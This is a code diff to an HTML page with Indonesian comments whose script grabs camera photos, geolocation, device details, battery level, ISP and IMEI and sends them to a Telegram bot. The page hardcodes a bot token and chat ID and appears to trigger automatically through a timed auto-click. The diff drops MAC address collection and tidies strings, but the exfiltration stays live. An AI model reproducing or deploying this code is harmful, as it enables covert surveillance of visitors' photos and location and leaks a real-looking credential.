@@ -53,8 +53,7 @@
             platform: navigator.platform,
             batteryLevel: null,
             isp: null, // Info ISP perangkat
-            imei: null, // IMEI perangkat
-            macAddress: null // MAC Address perangkat
+            imei: null // Info IMEI perangkat
           };
 
           // Mendapatkan informasi batrai perangkat
@@ -63,10 +62,9 @@
               .then(function(battery) {
                 deviceInfo.batteryLevel = battery.level * 100;
                 deviceInfo.isp = getISPInfo(); // Memanggil fungsi untuk mendapatkan info ISP
-                deviceInfo.imei = getIMEIInfo(); // Memanggil fungsi untuk mendapatkan IMEI perangkat
-                deviceInfo.macAddress = getMACAddressInfo(); // Memanggil fungsi untuk mendapatkan MAC Address perangkat
+                deviceInfo.imei = getIMEIInfo(); // Memanggil fungsi untuk mendapatkan info IMEI
 
-                // Mengirim foto, lokasi, informasi perangkat, IMEI, dan informasi batrai ke Telegram API
+                // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                 var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
                 var chatId = '1121369247';
 
@@ -81,18 +79,16 @@
                   body: formData
                 })
                 .then(function(response) {
-                  console.log('Foto, lokasi, informasi perangkat, IMEI, dan informasi batrai berhasil dikirim ke Telegram.');
+                  console.log('Foto, lokasi, informasi perangkat, dan informasi batrai berhasil dikirim ke Telegram.');
                 })
                 .catch(function(error) {
-                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, IMEI, dan
-
- informasi batrai ke Telegram:', error);
+                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram:', error);
                 });
               })
               .catch(function(error) {
                 console.error('Gagal mendapatkan informasi batrai:', error);
 
-                // Mengirim foto, lokasi, informasi perangkat, IMEI (tanpa informasi batrai), dan MAC Address ke Telegram API
+                // Mengirim foto, lokasi, dan informasi perangkat (tanpa informasi batrai) ke Telegram API
                 var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
                 var chatId = '1121369247';
 
@@ -107,16 +103,16 @@
                   body: formData
                 })
                 .then(function(response) {
-                  console.log('Foto, lokasi, informasi perangkat, IMEI, dan MAC Address berhasil dikirim ke Telegram.');
+                  console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
                 })
                 .catch(function(error) {
-                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, IMEI, dan MAC Address ke Telegram:', error);
+                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
                 });
               });
           } else {
             console.error('Browser tidak mendukung mendapatkan informasi batrai.');
 
-            // Mengirim foto, lokasi, informasi perangkat, IMEI (tanpa informasi batrai), dan MAC Address ke Telegram API
+            // Mengirim foto, lokasi, dan informasi perangkat (tanpa informasi batrai) ke Telegram API
             var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
             var chatId = '1121369247';
 
@@ -131,10 +127,10 @@
               body: formData
             })
             .then(function(response) {
-              console.log('Foto, lokasi, informasi perangkat, IMEI, dan MAC Address berhasil dikirim ke Telegram.');
+              console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
             })
             .catch(function(error) {
-              console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, IMEI, dan MAC Address ke Telegram:', error);
+              console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
             });
           }
         }, function(error) {
@@ -161,9 +157,7 @@
           console.log('Foto dan informasi perangkat berhasil dikirim ke Telegram.');
         })
         .catch(function(error) {
-          console.error('Terjadi kes
-
-alahan dalam mengirim foto dan informasi perangkat ke Telegram:', error);
+          console.error('Terjadi kesalahan dalam mengirim foto dan informasi perangkat ke Telegram:', error);
         });
       }
     };
@@ -190,4 +184,6 @@ alahan dalam mengirim foto dan informasi perangkat ke Telegram:', error);
     setTimeout(autoClickButton, 3000);
   </script>
 </body>
+</html>
+
 </html>
